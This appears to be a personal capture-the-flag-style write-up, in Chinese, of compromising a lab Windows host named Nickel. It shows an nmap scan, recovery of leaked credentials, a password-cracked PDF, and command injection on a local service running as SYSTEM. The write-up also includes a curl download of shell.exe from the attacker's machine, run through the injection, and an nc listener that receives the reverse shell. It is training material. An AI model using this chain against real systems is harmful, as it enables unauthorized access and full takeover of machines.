## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Wombo/redis-rogue-server]
└─$ sudo nmap -A -sV -sS -T4 192.168.156.99
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-16 21:46 CST
Nmap scan report for 192.168.156.99
Host is up (0.25s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2023-08-15T13:46:22
|_Not valid after:  2024-02-14T13:46:22
| rdp-ntlm-info:
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2023-08-16T13:47:49+00:00
|_ssl-date: 2023-08-16T13:49:01+00:00; 0s from scanner time.
8089/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/16%OT=21%CT=1%CU=32017%PV=Y%DS=4%DC=T%G=Y%TM=64DCD3C
OS:F%P=aarch64-unknown-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10F%TI=I%TS=U)OPS(O1=M
OS:54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENN
OS:S)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%
OS:W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(
OS:R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=55E%RUD=G)IE
OS:(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-08-16T13:47:49
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   245.91 ms 192.168.45.1
2   245.87 ms 192.168.45.254
3   246.82 ms 192.168.251.1
4   249.32 ms 192.168.156.99

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.45 seconds
```

嘗試訪問 8089 web service，看到 3 個按鈕
皆是嘗試連線到外部 ip 的 33333 port 底下路徑，將其改成靶機 ip 試試看
![[截圖 2023-08-16 下午10.04.10.png]]

用 Get 會顯示 cannot get，改用 post

![[截圖 2023-08-16 下午10.05.17.png]]

顯示需要 content length，加入 "" 試試

![[截圖 2023-08-16 下午10.05.58.png]]

成功！並得到疑似帳密資訊 (ssh key)

![[截圖 2023-08-16 下午10.03.42.png]]

```json
ariah/Tm93aXNlU2xvb3BUaGVvcnkxMzkK
```

有可能是 base64 編碼，拿去解碼後得到
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Nickel]
└─$ echo Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 --decode
NowiseSloopTheory139
```

用 ssh 登入成功！
```json
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

ariah@NICKEL C:\Users\ariah>
```

netstat 觀察其實 80 port 上有跑服務

```json
ariah@NICKEL C:\Users\ariah>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2072
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2152
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       832
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       344
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       1256
  TCP    0.0.0.0:8089           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:33333          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       352
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1040
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1672
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       2072
  TCP    192.168.169.99:22      192.168.45.216:40054   ESTABLISHED     2152
  TCP    192.168.169.99:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.169.99:49761   20.12.23.50:443        SYN_SENT        352
  TCP    192.168.169.99:49762   23.77.197.145:80       SYN_SENT        1304
  TCP    [::]:21                [::]:0                 LISTENING       2072
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       832
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       344
  TCP    [::]:8089              [::]:0                 LISTENING       4
  TCP    [::]:33333             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       640
  TCP    [::]:49665             [::]:0                 LISTENING       512
  TCP    [::]:49666             [::]:0                 LISTENING       352
  TCP    [::]:49667             [::]:0                 LISTENING       1040
  TCP    [::]:49668             [::]:0                 LISTENING       604
  TCP    [::]:49669             [::]:0                 LISTENING       1672
  TCP    [::1]:14147            [::]:0                 LISTENING       2072
  UDP    0.0.0.0:123            *:*                                    5000
  UDP    0.0.0.0:500            *:*                                    352
  UDP    0.0.0.0:3389           *:*                                    344
  UDP    0.0.0.0:4500           *:*                                    352
  UDP    0.0.0.0:5050           *:*                                    1256
  UDP    0.0.0.0:5353           *:*                                    1304
  UDP    0.0.0.0:5355           *:*                                    1304
  UDP    127.0.0.1:1900         *:*                                    3676
  UDP    127.0.0.1:51538        *:*                                    3676
  UDP    127.0.0.1:58968        *:*                                    352
  UDP    192.168.169.99:137     *:*                                    4
  UDP    192.168.169.99:138     *:*                                    4
  UDP    192.168.169.99:1900    *:*                                    3676
  UDP    192.168.169.99:51537   *:*                                    3676
  UDP    [::]:123               *:*                                    5000
  UDP    [::]:500               *:*                                    352
  UDP    [::]:3389              *:*                                    344
  UDP    [::]:4500              *:*                                    352
  UDP    [::1]:1900             *:*                                    3676
  UDP    [::1]:51536            *:*                                    3676
```

上傳 winPEASx64.exe 沒發現可利用點，在 C:\\ 底下發現有個 Infrastructure.pdf 檔案，把他傳回 kali 看看

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Nickel]
└─$ scp ariah@192.168.156.99:C:/ftp/Infrastructure.pdf .
ariah@192.168.156.99's password:
Infrastructure.pdf
```

發現 pdf 有加密，使用 pdfcrack 破解

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Nickel]
└─$ pdfcrack Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt
PDF version 1.7
Security Handler: Standard
V: 2
R: 3
P: -1060
Length: 128
Encrypted Metadata: True
FileID: 14350d814f7c974db9234e3e719e360b
U: 6aa1a24681b93038947f76796470dbb100000000000000000000000000000000
O: d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0
Average Speed: 99932.4 w/s. Current Word: 'bdm1992'
Average Speed: 99110.8 w/s. Current Word: 'sasnr1'
Average Speed: 99318.0 w/s. Current Word: 'luvumaiko'
Average Speed: 99259.9 w/s. Current Word: 'garfield36'
Average Speed: 99461.2 w/s. Current Word: 'astommy'
found user-password: 'ariah4168'
```

成功破解！

![[截圖 2023-08-16 下午11.53.49.png]]

疑似可以 command injection，嘗試從 local 連到 80 port，確認是否可以利用

```json
ariah@NICKEL C:\Users\ariah>curl http://192.168.169.99/?whoami
<!doctype html><html><body>dev-api started at 2023-02-17T09:16:22

        <pre>nt authority\system
</pre>
</body></html>
```

成功利用！且為 system 權限

嘗試上傳 shell

```json
ariah@NICKEL C:\Users\ariah>curl http://192.168.45.216:8000/shell.exe --output shell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7168  100  7168    0     0   7168      0  0:00:01 --:--:--  0:00:01 13499

ariah@NICKEL C:\Users\ariah>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Users\ariah

08/17/2023  07:32 AM    <DIR>          .
08/17/2023  07:32 AM    <DIR>          ..
10/15/2020  07:23 AM    <DIR>          3D Objects
10/15/2020  07:23 AM    <DIR>          Contacts
04/14/2022  04:46 AM    <DIR>          Desktop
10/15/2020  07:23 AM    <DIR>          Documents
10/15/2020  07:23 AM    <DIR>          Downloads
10/15/2020  07:23 AM    <DIR>          Favorites
10/15/2020  07:23 AM    <DIR>          Links
10/15/2020  07:23 AM    <DIR>          Music
10/15/2020  07:25 AM    <DIR>          Pictures
10/15/2020  07:23 AM    <DIR>          Saved Games
10/15/2020  07:24 AM    <DIR>          Searches
08/17/2023  07:32 AM             7,168 shell.exe
10/15/2020  07:23 AM    <DIR>          Videos
               1 File(s)          7,168 bytes
              14 Dir(s)   7,706,730,496 bytes free
```

透過 curl command injection 執行 shell.exe

```json
ariah@NICKEL C:\Users\ariah>curl http://192.168.169.99/?cd%20C%3A%5CUsers%5Cariah
<!doctype html><html><body>dev-api started at 2023-02-17T09:16:22

        <pre></pre>
</body></html>
ariah@NICKEL C:\Users\ariah>curl http://192.168.169.99/?.\shell.exe
<!doctype html><html><body>dev-api started at 2023-02-17T09:16:22

        <pre></pre>
</body></html>
ariah@NICKEL C:\Users\ariah>
```

nc:
```json
┌──(ouyang㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.216] from (UNKNOWN) [192.168.169.99] 50143
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\ariah>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Users\ariah

08/17/2023  07:32 AM    <DIR>          .
08/17/2023  07:32 AM    <DIR>          ..
10/15/2020  07:23 AM    <DIR>          3D Objects
10/15/2020  07:23 AM    <DIR>          Contacts
04/14/2022  04:46 AM    <DIR>          Desktop
10/15/2020  07:23 AM    <DIR>          Documents
10/15/2020  07:23 AM    <DIR>          Downloads
10/15/2020  07:23 AM    <DIR>          Favorites
10/15/2020  07:23 AM    <DIR>          Links
10/15/2020  07:23 AM    <DIR>          Music
10/15/2020  07:25 AM    <DIR>          Pictures
10/15/2020  07:23 AM    <DIR>          Saved Games
10/15/2020  07:24 AM    <DIR>          Searches
08/17/2023  07:32 AM             7,168 shell.exe
10/15/2020  07:23 AM    <DIR>          Videos
               1 File(s)          7,168 bytes
              14 Dir(s)   7,707,410,432 bytes free

C:\Users\ariah>whoami
whoami
nt authority\system
```

get shell!
